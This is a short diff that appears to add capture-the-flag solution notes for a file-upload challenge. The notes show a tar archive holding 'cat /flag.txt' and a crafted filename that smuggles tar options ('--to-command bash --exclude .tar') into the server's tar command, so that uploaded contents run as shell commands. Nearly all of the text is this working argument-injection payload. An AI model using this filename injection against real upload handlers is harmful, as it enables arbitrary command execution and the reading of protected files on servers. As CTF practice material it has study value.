@@ -1,0 +1,9 @@
+Upload flag.tar
+	command.txt
+		cat /flag.txt
+
+=> flag__663b07.tar
+
+cp flag.tar "flag__663b07.tar --to-command bash --exclude .tar"
+
+Upload flag__663b07.tar --to-command bash --exclude .tar
